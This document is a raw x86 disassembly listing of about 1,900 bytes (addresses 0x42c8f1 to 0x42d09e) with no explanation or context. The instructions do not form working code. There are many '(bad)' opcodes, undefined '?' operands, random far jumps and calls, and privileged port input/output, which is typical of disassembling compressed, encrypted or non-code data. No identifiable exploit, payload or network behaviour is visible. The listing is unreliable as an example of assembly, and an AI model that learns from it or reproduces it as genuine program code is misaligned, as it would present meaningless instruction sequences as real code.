  42c8f1:	push   eax
  42c8f2:	and    esi,DWORD PTR fs:[ebp-0x305c7318]
  42c8f9:	stc    
  42c8fa:	add    BYTE PTR [edi-0x6b],cl
  42c8fd:	ins    DWORD PTR es:[edi],dx
  42c8fe:	and    BYTE PTR [ecx+0x77458bd7],dl
  42c904:	and    eax,0x6d1f4d8c
  42c909:	mov    ds:0x84db8bcd,al
  42c90e:	shr    bh,0xd9
  42c911:	dec    edi
  42c912:	push   esi
  42c913:	push   es
  42c914:	sbb    ah,ch
  42c916:	call   0x3c62cc
  42c91b:	setne  BYTE PTR [esi+ebx*1-0x2f]
  42c920:	out    0x62,eax
  42c922:	add    BYTE PTR [eax],al
  42c924:	int    0x8a
  42c926:	adc    al,0x64
  42c928:	lea    ebx,[ebx]
  42c92a:	add    DWORD PTR [edx+0x53],ebp
  42c92d:	pop    edx
  42c92e:	inc    esp
  42c92f:	lock fwait
  42c931:	pop    eax
  42c932:	aas    
  42c933:	or     al,0x8b
  42c935:	mov    dl,BYTE PTR [esp+ebx*2]
  42c938:	dec    ebp
  42c939:	sbb    eax,DWORD PTR [ecx]
  42c93b:	or     DWORD PTR [edi],0xffffffe3
  42c93e:	mov    ecx,DWORD PTR [ebp+0x1f]
  42c941:	jae    0x42c98b
  42c943:	int    0x3b
  42c945:	fist   DWORD PTR [esi-0x37]
  42c948:	clc    
  42c949:	daa    
  42c94a:	dec    edi
  42c94b:	push   edi
  42c94c:	xchg   ecx,eax
  42c94d:	pushf  
  42c94e:	xor    cl,0xf3
  42c951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c952:	sbb    eax,0xaedbf4ff
  42c957:	rcl    BYTE PTR [edx+0xb00f74b],0xdb
  42c95e:	in     eax,dx
  42c95f:	push   DWORD PTR [ebp-0x6c]
  42c962:	adc    DWORD PTR [esi],0xff1e49e3
  42c968:	je     0x42c945
  42c96a:	scas   al,BYTE PTR es:[edi]
  42c96b:	shl    dl,0x93
  42c96e:	test   BYTE PTR [edx-0x74f64901],0x62
  42c975:	in     eax,0x50
  42c977:	adc    ah,BYTE PTR [edx]
  42c979:	shl    BYTE PTR [ebp+0x59],0x60
  42c97d:	dec    eax
  42c97e:	dec    eax
  42c97f:	push   DWORD PTR [edi-0x79847cfe]
  42c985:	lods   al,BYTE PTR ds:[esi]
  42c986:	std    
  42c987:	xchg   DWORD PTR [eax],eax
  42c989:	or     al,0xc1
  42c98b:	xor    DWORD PTR [ecx],edx
  42c98d:	or     ah,cl
  42c98f:	scas   al,BYTE PTR es:[edi]
  42c990:	jae    0x42c9d0
  42c992:	fdivr  DWORD PTR [edi+0x41]
  42c995:	xchg   ax,ax
  42c997:	scas   al,BYTE PTR es:[edi]
  42c998:	shl    cl,cl
  42c99a:	hlt    
  42c99b:	stc    
  42c99c:	out    0x6a,al
  42c99e:	inc    ebp
  42c99f:	inc    eax
  42c9a0:	add    al,0x8a
  42c9a2:	shr    DWORD PTR [esi+0x115a6dfa],0xe8
  42c9a9:	adc    al,0x74
  42c9ab:	std    
  42c9ac:	push   DWORD PTR [edx-0x4de7b8bb]
  42c9b2:	scas   eax,DWORD PTR es:[edi]
  42c9b3:	xlat   BYTE PTR ds:[ebx]
  42c9b4:	jle    0x42c9dc
  42c9b6:	mov    ah,0x50
  42c9b8:	pop    edx
  42c9b9:	test   eax,0x96fffc82
  42c9be:	dec    ebx
  42c9bf:	mov    eax,ds:0x57e69150
  42c9c4:	push   ecx
  42c9c5:	jno    0x42ca32
  42c9c7:	push   ebx
  42c9c8:	push   0xfffdb4a8
  42c9cd:	jmp    0xba57794b
  42c9d2:	sar    DWORD PTR ds:0x816fd900,1
  42c9d8:	icebp  
  42c9d9:	mov    ?,ebp
  42c9db:	push   ebx
  42c9dc:	xchg   DWORD PTR ds:0xece7bf4b,edx
  42c9e2:	sub    BYTE PTR [edi-0x4f032406],0x84
  42c9e9:	and    al,ah
  42c9eb:	inc    edx
  42c9ec:	daa    
  42c9ed:	add    BYTE PTR [edi-0x27],ah
  42c9f0:	stos   DWORD PTR es:[edi],eax
  42c9f1:	pop    ds
  42c9f2:	push   ds
  42c9f3:	fnstenv [esi+0x2d41d54]
  42c9f9:	cs test cl,bl
  42c9fc:	mov    bh,0x54
  42c9fe:	sub    eax,0xee174327
  42ca03:	out    0xa7,eax
  42ca05:	add    esp,ebp
  42ca07:	shr    BYTE PTR [ecx+esi*4+0x31],1
  42ca0b:	out    0xbf,al
  42ca0d:	adc    eax,DWORD PTR [ecx-0x27]
  42ca10:	out    0x58,eax
  42ca12:	cdq    
  42ca13:	jecxz  0x42ca84
  42ca15:	push   ss
  42ca16:	and    bl,cl
  42ca18:	mov    edx,0xf5716eb0
  42ca1d:	inc    ebx
  42ca1e:	bound  ecx,QWORD PTR [edx+0x41659ce8]
  42ca24:	call   0x971037ac
  42ca29:	mov    al,0xee
  42ca2b:	int3   
  42ca2c:	xchg   ecx,eax
  42ca2d:	mov    al,0x76
  42ca2f:	jne    0x42ca29
  42ca31:	inc    ebx
  42ca32:	bound  esp,QWORD PTR [ebx]
  42ca34:	fist   DWORD PTR [esi]
  42ca36:	jmp    0x5e2b:0xa90427e7
  42ca3d:	les    edx,FWORD PTR [edx+eiz*4+0x5a6207a5]
  42ca44:	retf   
  42ca45:	cmp    ebp,DWORD PTR [ecx*8-0x668bab19]
  42ca4c:	adc    al,0x5a
  42ca4e:	dec    ebp
  42ca4f:	ret    
  42ca50:	(bad)  
  42ca51:	int3   
  42ca52:	add    BYTE PTR [eax+0x6de81362],dh
  42ca58:	bound  ebp,QWORD PTR [ebx]
  42ca5a:	call   0xe86e2cc8
  42ca5f:	push   ecx
  42ca60:	aas    
  42ca61:	call   0xd50ebe83
  42ca66:	daa    
  42ca67:	push   ebx
  42ca68:	sbb    DWORD PTR [ecx],eax
  42ca6a:	jmp    0x6e707ed5
  42ca6f:	pop    eax
  42ca70:	push   eax
  42ca71:	and    eax,0xf9cddf01
  42ca76:	out    dx,al
  42ca77:	in     eax,0x24
  42ca79:	add    cl,ch
  42ca7b:	popa   
  42ca7c:	pop    esi
  42ca7d:	inc    esp
  42ca7e:	add    eax,0x2e541c9e
  42ca83:	sbb    eax,0x640d30f5
  42ca88:	fld    DWORD PTR [eax]
  42ca8a:	ss dec esp
  42ca8c:	xchg   ecx,eax
  42ca8d:	pop    gs
  42ca8f:	popa   
  42ca90:	push   esi
  42ca91:	shl    dh,0xdd
  42ca94:	std    
  42ca95:	(bad)  
  42ca96:	call   0xcd8f1efc
  42ca9b:	xchg   ecx,eax
  42ca9c:	push   ebp
  42ca9d:	(bad)  
  42ca9e:	fsubrp st(5),st
  42caa0:	loope  0x42caa1
  42caa2:	call   0x714ecf08
  42caa7:	xor    DWORD PTR ds:0xcddde601,edx
  42caad:	add    cl,ch
  42caaf:	popa   
  42cab0:	cld    
  42cab1:	shr    BYTE PTR [ecx+ebp*1+0x48],0xb
  42cab6:	and    BYTE PTR [eax],al
  42cab8:	bound  edx,QWORD PTR [edi+0x9]
  42cabb:	ins    DWORD PTR es:[edi],dx
  42cabc:	in     al,0xcb
  42cabe:	stc    
  42cabf:	jmp    0x3c00cf65
  42cac4:	lock mov bl,0x18
  42cac7:	test   eax,0x2d87cefd
  42cacc:	cmp    bl,ah
  42cace:	sub    DWORD PTR [ecx-0x1627a7e3],0x61
  42cad5:	fyl2xp1 
  42cad7:	adc    eax,0xe966fbfa
  42cadc:	imul   ebx,ecx,0xd061e904
  42cae2:	adc    eax,DWORD PTR [eax]
  42cae4:	inc    ebx
  42cae5:	out    0x40,al
  42cae7:	add    BYTE PTR [eax+0x7d],dh
  42caea:	test   bh,bh
  42caec:	cld    
  42caed:	push   ebx
  42caee:	stos   DWORD PTR es:[edi],eax
  42caef:	add    bl,cl
  42caf1:	xlat   BYTE PTR ds:[ebx]
  42caf2:	mov    edx,DWORD PTR [edi+eiz*2-0x3f]
  42caf6:	or     bh,0x33
  42caf9:	jmp    0x506fca39
  42cafe:	rcl    BYTE PTR [edi+0x2c],cl
  42cb01:	repnz cwde 
  42cb03:	adc    cl,BYTE PTR [ebx]
  42cb05:	fadd   DWORD PTR [ebx-0x74ac4325]
  42cb0b:	add    BYTE PTR [ebx+0x674c81d7],bh
  42cb11:	shl    DWORD PTR [edx],0xd
  42cb14:	retf   
  42cb15:	jmp    0x42cb5b
  42cb17:	add    dh,dh
  42cb19:	adc    dh,dh
  42cb1b:	xor    eax,DWORD PTR [eax]
  42cb1d:	ins    BYTE PTR es:[edi],dx
  42cb1e:	repnz pusha 
  42cb20:	adc    bl,cl
  42cb22:	xlat   BYTE PTR ds:[ebx]
  42cb23:	xor    DWORD PTR ds:0x44eba3,eax
  42cb29:	test   BYTE PTR [eax],0x82
  42cb2c:	adc    eax,0x44eba7
  42cb31:	ror    dh,0x82
  42cb34:	adc    bl,BYTE PTR [ebx+0x3b56ef6d]
  42cb3a:	xlat   BYTE PTR ds:[ebx]
  42cb3b:	add    eax,0xffffffa6
  42cb3e:	and    al,0x82
  42cb40:	jl     0x42cba9
  42cb42:	icebp  
  42cb43:	mov    ecx,DWORD PTR [edi+eiz*2-0x4b]
  42cb47:	mov    WORD PTR [esi+ebp*4],ss
  42cb4a:	rol    BYTE PTR [eax],cl
  42cb4c:	add    BYTE PTR [ebx],bh
  42cb4e:	outs   dx,DWORD PTR ds:[esi]
  42cb4f:	imul   edx,DWORD PTR [ebp+0xb],0xffffffd7
  42cb53:	xor    DWORD PTR [edi+eiz*1-0x49],0xd077c07d
  42cb5b:	add    BYTE PTR [edx+eiz*2-0x64],0xed
  42cb60:	mov    BYTE PTR [esi+0x1a],ah
  42cb63:	inc    ebx
  42cb64:	sti    
  42cb65:	sahf   
  42cb66:	pushf  
  42cb67:	add    eax,0x11946e89
  42cb6c:	xchg   DWORD PTR [esi-0x64],esp
  42cb6f:	or     eax,0xe8ece951
  42cb74:	xor    ebp,ecx
  42cb76:	or     edx,DWORD PTR [esi-0x54d433b8]
  42cb7c:	xchg   BYTE PTR [esi],dl
  42cb7e:	fcom   QWORD PTR [eax]
  42cb80:	das    
  42cb81:	add    BYTE PTR [eax+0x20c873ab],dl
  42cb87:	cmp    al,0xbe
  42cb89:	or     ah,BYTE PTR [edi]
  42cb8b:	push   es
  42cb8c:	jge    0x42cbd9
  42cb8e:	jle    0x42cb34
  42cb90:	xchg   esi,eax
  42cb91:	add    ebp,ecx
  42cb93:	jl     0x42cb76
  42cb95:	psubsw mm0,QWORD PTR [edi]
  42cb98:	xchg   esi,eax
  42cb99:	in     al,0x37
  42cb9b:	sar    ch,0x86
  42cb9e:	es pushf 
  42cba0:	adc    edi,esp
  42cba2:	push   0x37
  42cba4:	dec    edx
  42cba5:	and    al,0x4e
  42cba7:	inc    edi
  42cba8:	sub    ah,BYTE PTR [edx+edx*2]
  42cbab:	arpl   WORD PTR [edx+0x3daeca14],bp
  42cbb1:	add    bh,ch
  42cbb3:	jae    0x42cb96
  42cbb5:	daa    
  42cbb6:	mov    dl,0xd
  42cbb8:	lods   al,BYTE PTR ds:[esi]
  42cbb9:	adc    al,0xe
  42cbbb:	sar    DWORD PTR ds:0xfb7fdf00,1
  42cbc1:	test   BYTE PTR ds:0xe9faab9a,dl
  42cbc7:	adc    ebp,ecx
  42cbc9:	pop    ss
  42cbca:	xchg   edi,eax
  42cbcb:	mov    edx,DWORD PTR [ecx]
  42cbcd:	cwde   
  42cbce:	push   eax
  42cbcf:	add    BYTE PTR ds:0x82ab1d85,al
  42cbd5:	mov    WORD PTR [ecx+ebx*8],ss
  42cbd8:	mov    ds:0x8f9ae4ad,al
  42cbdd:	bound  ebp,QWORD PTR [esi-0x5e871827]
  42cbe3:	cmc    
  42cbe4:	jmp    0x42cc32
  42cbe6:	add    BYTE PTR [eax+0x21831f2c],bl
  42cbec:	and    esi,esp
  42cbee:	add    esp,DWORD PTR [edx-0x6a]
  42cbf1:	sbb    DWORD PTR [ebp+0x69],edx
  42cbf4:	sub    ebx,0xffffffe7
  42cbf7:	imul   ebx,DWORD PTR [esi+0x58],0xef8ad979
  42cbfe:	add    ah,BYTE PTR [edx-0x27]
  42cc01:	ins    BYTE PTR es:[edi],dx
  42cc02:	mov    ebx,0x35ed331
  42cc07:	cmp    al,0xd8
  42cc09:	inc    edx
  42cc0a:	adc    al,0x2d
  42cc0c:	jne    0x42cc87
  42cc0e:	cld    
  42cc0f:	(bad)  
  42cc10:	(bad)  
  42cc12:	add    ecx,DWORD PTR [ebp-0x67]
  42cc15:	sar    DWORD PTR [edx-0x1f],0x4a
  42cc19:	add    BYTE PTR [ebx],al
  42cc1b:	(bad)  
  42cc1c:	fnstcw WORD PTR [edx-0x182b3bb3]
  42cc22:	or     BYTE PTR [ecx+0x6203e7c4],0x26
  42cc29:	popf   
  42cc2a:	push   ebp
  42cc2b:	in     eax,0xc7
  42cc2d:	mov    dh,0xc8
  42cc2f:	adc    BYTE PTR [ebx+eiz*4-0x19],bl
  42cc33:	xchg   ebp,eax
  42cc34:	push   ecx
  42cc35:	mov    esp,edi
  42cc37:	jo     0x42cbea
  42cc39:	call   0x7e3f:0x6cc94dd3
  42cc40:	sbb    eax,0xc8a9d0c0
  42cc45:	retf   0xa97e
  42cc48:	std    
  42cc49:	sub    eax,ebp
  42cc4b:	add    BYTE PTR [ecx-0x3befdc03],ah
  42cc51:	sbb    DWORD PTR [ecx],eax
  42cc53:	jmp    0x1d67f0f0
  42cc58:	test   BYTE PTR ds:0x5fbea64a,0x7c
  42cc5f:	lds    eax,FWORD PTR [ebp-0x7f]
  42cc62:	mov    edi,0x8bd9a16a
  42cc67:	pop    edi
  42cc68:	imul   ebx,edx,0x726ce900
  42cc6e:	or     al,ch
  42cc70:	popa   
  42cc71:	(bad)  [eax-0x780735eb]
  42cc77:	and    eax,0xb587f0ca
  42cc7c:	(bad)
  42cc7f:	int    0xbd
  42cc81:	call   0x60a4810b
  42cc86:	push   0x253438ea
  42cc8b:	adc    ebp,esp
  42cc8d:	scas   eax,DWORD PTR es:[edi]
  42cc8e:	je     0x42cc3f
  42cc90:	and    al,0x1c
  42cc92:	and    eax,0x44563199
  42cc97:	add    eax,0xf1692926
  42cc9c:	jno    0x42cc77
  42cc9e:	add    BYTE PTR [ecx-0x16ff3c4a],dl
  42cca4:	into   
  42cca5:	aaa    
  42cca6:	add    eax,0x64fd1d26
  42ccab:	in     eax,dx
  42ccac:	popa   
  42ccad:	fld    DWORD PTR [eax]
  42ccaf:	inc    BYTE PTR [eax]
  42ccb1:	dec    edi
  42ccb2:	loope  0x42ccc6
  42ccb4:	test   eax,0x74c05e61
  42ccb9:	outs   dx,DWORD PTR ds:[esi]
  42ccba:	push   esi
  42ccbb:	inc    esp
  42ccbc:	or     eax,0x5afa29b2
  42ccc1:	inc    esi
  42ccc2:	ret    
  42ccc3:	adc    ebx,ecx
  42ccc5:	push   edi
  42ccc6:	sbb    DWORD PTR [ecx],eax
  42ccc8:	fs push ds
  42ccca:	rol    DWORD PTR [ebx+0xde0600],cl
  42ccd0:	add    ah,ah
  42ccd2:	or     BYTE PTR ds:0xe1838030,ah
  42ccd8:	sbb    esp,eax
  42ccda:	jae    0x42ccd2
  42ccdc:	mov    edi,DWORD PTR [edi]
  42ccde:	mov    ecx,0x74538a11
  42cce3:	loope  0x42cc7c
  42cce5:	outs   dx,BYTE PTR ds:[esi]
  42cce6:	fld    QWORD PTR [eax]
  42cce8:	test   bl,cl
  42ccea:	or     DWORD PTR [ebx+esi*1],ebx
  42cced:	mov    ebx,0x174437fa
  42ccf2:	mov    ah,0x6
  42ccf4:	test   BYTE PTR [esi-0x67ffff22],bl
  42ccfa:	ficomp WORD PTR [esi-0x77]
  42ccfd:	jmp    FWORD PTR [edi-0x57f877cf]
  42cd03:	push   cs
  42cd04:	jmp    0x43aaeb
  42cd09:	mov    eax,ds:0xc8db29d7
  42cd0e:	jb     0x42cd44
  42cd10:	dec    eax
  42cd11:	in     al,0x7
  42cd13:	add    edi,edi
  42cd15:	add    BYTE PTR [esi-0x74bff681],bh
  42cd1b:	pop    eax
  42cd1c:	mov    ecx,0x4e486374
  42cd21:	and    al,0x63
  42cd23:	les    ebp,FWORD PTR [edi-0x503d45f6]
  42cd29:	dec    edx
  42cd2a:	fs cs or al,0x53
  42cd2f:	inc    ebx
  42cd30:	push   ebx
  42cd31:	add    BYTE PTR [ebx+0x46],bh
  42cd34:	loop   0x42cd21
  42cd36:	dec    ecx
  42cd37:	dec    eax
  42cd38:	jecxz  0x42ccbf
  42cd3a:	push   esi
  42cd3b:	les    edi,FWORD PTR [ebp+0x6e]
  42cd3e:	cmp    bl,bl
  42cd40:	add    BYTE PTR [eax-0x7ad24679],cl
  42cd46:	bound  ebp,QWORD PTR [edi-0x4016d4d7]
  42cd4c:	js     0x42cd99
  42cd4e:	xchg   ah,ch
  42cd50:	push   ebx
  42cd51:	push   ebx
  42cd52:	and    eax,0x2284f4e1
  42cd57:	push   es
  42cd58:	in     eax,0x7e
  42cd5a:	sub    edi,DWORD PTR [eax+0x1f]
  42cd5d:	cmp    DWORD PTR [esi-0x11f52e6c],ebx
  42cd63:	jo     0x42cdde
  42cd65:	mov    edi,0x27ac177
  42cd6a:	xchg   ebx,eax
  42cd6b:	xsha1  (bad)
  42cd6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd6d:	dec    edi
  42cd6e:	ss inc edi
  42cd70:	(bad)  
  42cd71:	adc    eax,0x88be4722
  42cd76:	es xchg esp,eax
  42cd78:	jmp    0x9c60ce03
  42cd7d:	aad    0xa
  42cd7f:	adc    eax,0xa37f98d
  42cd84:	rcr    esi,0xff
  42cd87:	mov    ebp,0x30c7ea96
  42cd8c:	enter  0x2f65,0x37
  42cd90:	mov    al,0xfd
  42cd92:	popa   
  42cd93:	imul   ecx,DWORD PTR [eax],0xa4080a2f
  42cd99:	push   esp
  42cd9a:	xchg   DWORD PTR [edi+0x62605318],esp
  42cda0:	mov    al,0x79
  42cda2:	mov    edi,0xeb82860f
  42cda7:	push   edx
  42cda8:	cmp    edi,DWORD PTR [ecx-0x2af1919]
  42cdae:	(bad)  
  42cdaf:	(bad)  ds:0xb3efbf7a
  42cdb5:	jp     0x42cdfb
  42cdb7:	bound  ebx,QWORD PTR [edx+0x4]
  42cdba:	sti    
  42cdbb:	jb     0x42cd96
  42cdbd:	lods   eax,DWORD PTR ds:[esi]
  42cdbe:	dec    DWORD PTR [ebp-0x27]
  42cdc1:	out    0x76,eax
  42cdc3:	loope  0x42cdc1
  42cdc5:	addr16 add al,0x62
  42cdc8:	fnstenv [edi]
  42cdca:	pushf  
  42cdcb:	fwait
  42cdcc:	daa    
  42cdcd:	call   0x3bdbb3d5
  42cdd2:	in     al,0x58
  42cdd4:	mov    fs,WORD PTR [ebx-0x20]
  42cdd7:	popf   
  42cdd8:	(bad)  
  42cdda:	add    ebp,DWORD PTR [edx+0xff3411]
  42cde0:	mov    WORD PTR [ecx-0x29a5d104],?
  42cde6:	push   edx
  42cde7:	mov    BYTE PTR [ecx+0x5b],al
  42cdea:	out    0x3,eax
  42cdec:	bound  edi,QWORD PTR [edi]
  42cdee:	test   eax,0x3ad665c5
  42cdf3:	int    0xdc
  42cdf5:	sbb    al,0xc4
  42cdf7:	fild   DWORD PTR [ebx+0x50]
  42cdfa:	adc    eax,DWORD PTR [eax]
  42cdfc:	call   0xfafd:0x297be88a
  42ce03:	pushf  
  42ce04:	popa   
  42ce05:	push   ebx
  42ce06:	mov    ebx,0xab5250df
  42ce0b:	fist   WORD PTR [ebp+0x52]
  42ce0e:	fisttp WORD PTR [ecx+0x50]
  42ce12:	(bad)  
  42ce14:	cmp    ebp,edi
  42ce16:	mov    cr4,ebp
  42ce19:	sbb    al,0x4
  42ce1b:	in     al,dx
  42ce1c:	add    edx,DWORD PTR [eax-0x18]
  42ce1f:	jle    0x42cda9
  42ce21:	aad    0x6b
  42ce23:	xchg   esp,eax
  42ce24:	test   ebp,eax
  42ce26:	out    0x7c,eax
  42ce28:	pusha  
  42ce29:	push   esp
  42ce2a:	mov    ds:0xb32841df,eax
  42ce2f:	test   al,0x1d
  42ce31:	icebp  
  42ce32:	ins    BYTE PTR es:[edi],dx
  42ce33:	(bad)  
  42ce34:	out    dx,al
  42ce35:	in     eax,dx
  42ce36:	mov    sp,0x3c58
  42ce3a:	add    DWORD PTR [eax-0x21db026b],esi
  42ce40:	fld    QWORD PTR [esp+edi*1-0x2e8bff18]
  42ce47:	test   esi,esp
  42ce49:	pop    edi
  42ce4a:	fst    DWORD PTR [ecx-0x2a]
  42ce4d:	xchg   ecx,eax
  42ce4e:	cmc    
  42ce4f:	test   DWORD PTR ds:0x7f09ed42,esp
  42ce55:	popa   
  42ce56:	adc    DWORD PTR [ebp-0xd],esi
  42ce59:	pop    ecx
  42ce5a:	dec    esi
  42ce5b:	inc    edi
  42ce5c:	inc    ebx
  42ce5d:	stos   BYTE PTR es:[edi],al
  42ce5e:	and    ah,BYTE PTR [edi-0x28]
  42ce61:	out    dx,al
  42ce62:	frstor [esi+0x42]
  42ce65:	cdq    
  42ce66:	cmp    eax,DWORD PTR [ebx]
  42ce68:	inc    edx
  42ce69:	jne    0x42ce93
  42ce6b:	and    eax,0xf35dd631
  42ce70:	mov    WORD PTR [edx+0xa2db1cf],?
  42ce76:	or     eax,0xfd9d6c51
  42ce7b:	pop    esp
  42ce7c:	sbb    DWORD PTR [ebp+0x18],ecx
  42ce7f:	and    eax,0x50d56ff9
  42ce84:	push   ecx
  42ce85:	mov    bl,0x72
  42ce87:	add    cl,ch
  42ce89:	out    0x98,al
  42ce8b:	adc    BYTE PTR [ecx+eiz*4+0x42],ch
  42ce8f:	adc    ebx,esi
  42ce91:	xor    bl,BYTE PTR [eax]
  42ce93:	sub    eax,0x51141101
  42ce98:	ins    BYTE PTR es:[edi],dx
  42ce99:	pop    ebp
  42ce9a:	std    
  42ce9b:	je     0x42ce36
  42ce9d:	or     al,0x10
  42ce9f:	and    eax,0x4acfe995
  42cea4:	es mov edx,0xc57d44
  42ceaa:	(bad)  
  42ceab:	les    ebp,FWORD PTR [ebp-0x1f]
  42ceae:	not    dh
  42ceb0:	jmpw   0x8ec6
  42ceb4:	push   eax
  42ceb5:	add    BYTE PTR [edi+0x34245646],ah
  42cebb:	inc    esi
  42cebc:	dec    esi
  42cebd:	and    al,0x1b
  42cebf:	inc    ebp
  42cec0:	data16 and al,0x1b
  42cec3:	inc    ebp
  42cec4:	ds and al,0x63
  42cec7:	pop    eax
  42cec8:	cmp    eax,0xf6da3f24
  42cecd:	ret    0x9ac8
  42ced0:	std    
  42ced1:	cmp    bl,0xc4
  42ced4:	adc    DWORD PTR [edi+edx*2-0x33],0xbd676c88
  42cedc:	mov    BYTE PTR [edi+eiz*2-0x2b],al
  42cee0:	cmp    dl,0x7
  42cee3:	retf   
  42cee4:	jnp    0x42ce8a
  42cee6:	mov    esi,0xdc85f67b
  42ceeb:	or     BYTE PTR ds:0xf613048b,cl
  42cef1:	push   eax
  42cef2:	add    eax,edi
  42cef4:	mov    ecx,0x45b93789
  42cef9:	mov    eax,DWORD PTR [ebp+0x51]
  42cefc:	add    BYTE PTR [eax],al
  42cefe:	retf   
  42ceff:	ds enter 0x4589,0xbd
  42cf04:	add    BYTE PTR [eax],al
  42cf06:	mov    ebx,0xca387f85
  42cf0b:	xlat   BYTE PTR ds:[ebx]
  42cf0c:	add    BYTE PTR [ecx],al
  42cf0e:	add    BYTE PTR [ebx],ah
  42cf10:	inc    ebx
  42cf11:	cli    
  42cf12:	(bad)  
  42cf13:	mov    ebx,0xc174ba43
  42cf18:	retf   0x8eaf
  42cf1b:	arpl   si,bx
  42cf1d:	add    BYTE PTR [eax],al
  42cf1f:	add    BYTE PTR [ebx+0x56],al
  42cf22:	add    DWORD PTR [ebx-0x29],edi
  42cf25:	xchg   DWORD PTR [ebp+ecx*1-0x74ffff43],eax
  42cf2c:	jge    0x42cfad
  42cf2e:	cmp    BYTE PTR [edx-0x4f],ah
  42cf31:	std    
  42cf32:	(bad)  
  42cf33:	clc    
  42cf34:	mov    ebp,0xc9a48d47
  42cf39:	add    al,0x0
  42cf3b:	bound  eax,QWORD PTR [edi-0x6]
  42cf3e:	test   BYTE PTR [edx],ah
  42cf40:	inc    ebp
  42cf41:	or     ecx,DWORD PTR [ebx]
  42cf43:	adc    al,0x23
  42cf45:	in     eax,dx
  42cf46:	add    BYTE PTR [edx-0x50],ah
  42cf49:	jbe    0x42cf8a
  42cf4b:	push   0x49
  42cf4d:	jp     0x42ced8
  42cf4f:	xor    BYTE PTR [ecx+0x3b2cfffd],0xe6
  42cf56:	add    BYTE PTR [edx-0x50],ah
  42cf59:	jle    0x42cf1d
  42cf5b:	pushw  es
  42cf5d:	xor    ch,bl
  42cf5f:	loop   0x42cee8
  42cf61:	add    al,0x75
  42cf63:	inc    ecx
  42cf64:	push   ss
  42cf65:	stc    
  42cf66:	mov    WORD PTR [esi-0x10b01e6c],ds
  42cf6c:	cld    
  42cf6d:	loopne 0x42cfce
  42cf6f:	xchg   edx,eax
  42cf70:	imul   edx,DWORD PTR [eax],0x5c
  42cf73:	add    BYTE PTR [eax+esi*8+0x4],dl
  42cf77:	jg     0x42cf97
  42cf79:	int    0x78
  42cf7b:	push   ebx
  42cf7c:	xchg   al,bh
  42cf7e:	push   ss
  42cf7f:	or     al,0x48
  42cf81:	aad    0x4b
  42cf83:	call   0x4045d2
  42cf88:	xlat   BYTE PTR ds:[ebx]
  42cf89:	mov    ecx,ds
  42cf8b:	inc    ebx
  42cf8c:	retf   0x372d
  42cf8f:	sti    
  42cf90:	mov    ch,0x8b
  42cf92:	inc    ebx
  42cf93:	pop    ebp
  42cf94:	or     DWORD PTR [ecx],esi
  42cf96:	mov    edx,0xfdb062f3
  42cf9b:	mov    esi,0x2eb54734
  42cfa0:	mov    ds:0x635b7bc9,al
  42cfa5:	mov    al,0xfd
  42cfa7:	je     0x42d013
  42cfa9:	fnstenv [edi+0x1b291253]
  42cfaf:	adc    BYTE PTR [edx-0x24fc5819],ah
  42cfb5:	pop    ebx
  42cfb6:	stos   DWORD PTR es:[edi],eax
  42cfb7:	add    al,0x62
  42cfb9:	fldcw  WORD PTR [ebx+eax*8-0x2a]
  42cfbd:	fnsave [ebp+0x3796bbc3]
  42cfc3:	add    al,0xa8
  42cfc5:	xchg   esi,eax
  42cfc6:	xchg   di,ax
  42cfc8:	imul   edx,DWORD PTR [esi+0x4b],0x36d969e0
  42cfcf:	dec    edi
  42cfd0:	nop
  42cfd1:	sub    bl,BYTE PTR [edi-0x55]
  42cfd4:	and    BYTE PTR ds:0x6200e004,bl
  42cfda:	(bad)  
  42cfdc:	add    esp,ebp
  42cfde:	pop    ecx
  42cfdf:	out    dx,eax
  42cfe0:	add    ah,BYTE PTR [edx-0x27]
  42cfe3:	pusha  
  42cfe4:	inc    eax
  42cfe5:	inc    esi
  42cfe6:	stc    
  42cfe7:	pop    esi
  42cfe8:	jge    0x42d043
  42cfea:	fsub   st,st(7)
  42cfec:	add    ebp,ebx
  42cfee:	sbb    al,0xc4
  42cff0:	(bad)  
  42cff2:	pop    ecx
  42cff3:	rol    DWORD PTR [edx],cl
  42cff5:	(bad)  
  42cff6:	fnstenv [edi]
  42cff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cff9:	dec    esi
  42cffa:	adc    eax,0x66243d6
  42cfff:	(bad)  
  42d000:	jmp    0x42d00a
  42d002:	and    ecx,ebp
  42d004:	add    esp,DWORD PTR [edx-0x2e]
  42d007:	popa   
  42d008:	and    DWORD PTR [edx-0x27],0xffffffe7
  42d00c:	js     0x42cfee
  42d00e:	sub    al,0xe9
  42d010:	add    esp,DWORD PTR [edx-0x65]
  42d013:	stos   DWORD PTR es:[edi],eax
  42d014:	fistp  WORD PTR [edi-0x27]
  42d017:	pop    esi
  42d018:	or     dl,bh
  42d01a:	pop    ebx
  42d01b:	push   ds
  42d01c:	cmc    
  42d01d:	loope  0x42d041
  42d01f:	jmp    0x913227
  42d024:	and    ch,dh
  42d026:	cmp    edi,ecx
  42d028:	cs mov edi,0xfcf6c055
  42d02e:	push   cs
  42d02f:	add    cl,ch
  42d031:	popa   
  42d032:	repz into 
  42d034:	popa   
  42d035:	adc    bh,ch
  42d037:	or     eax,0xffd2261
  42d03c:	test   BYTE PTR [eax],0xcf
  42d03f:	cwde   
  42d040:	xchg   DWORD PTR [ebp+0x7d85e935],ebp
  42d046:	adc    eax,0x4ef783e1
  42d04b:	pop    ebp
  42d04c:	stc    
  42d04d:	jmp    0x974ca9b3
  42d052:	ja     0x42d021
  42d054:	push   eax
  42d055:	(bad)  
  42d056:	jmp    0x83d9:0x61ed9bb8
  42d05d:	test   eax,0xe9e15d16
  42d062:	popa   
  42d063:	(bad)  [ecx]
  42d065:	jle    0x42d019
  42d067:	in     eax,0x85
  42d069:	sbb    eax,0xdf85e902
  42d06e:	jp     0x42d084
  42d070:	int    0xc9
  42d072:	xchg   ebx,eax
  42d073:	les    ebp,FWORD PTR [ebp-0x7]
  42d076:	xchg   ecx,eax
  42d077:	les    edx,FWORD PTR [edx-0x7]
  42d07a:	xor    BYTE PTR gs:[edi+esi*8-0x2e],0xca
  42d080:	scas   eax,DWORD PTR es:[edi]
  42d081:	call   0xdb67e4df
  42d086:	dec    eax
  42d087:	dec    esp
  42d088:	and    eax,0xfa39ead5
  42d08d:	cld    
  42d08e:	cmc    
  42d08f:	in     eax,0x40
  42d091:	jmp    0xe964e9de
  42d096:	popa   
  42d097:	or     al,al
  42d099:	fisubr WORD PTR [esi]
  42d09b:	pop    ecx
  42d09c:	add    BYTE PTR [eax],al
  42d09e:	mov    ebx,esp
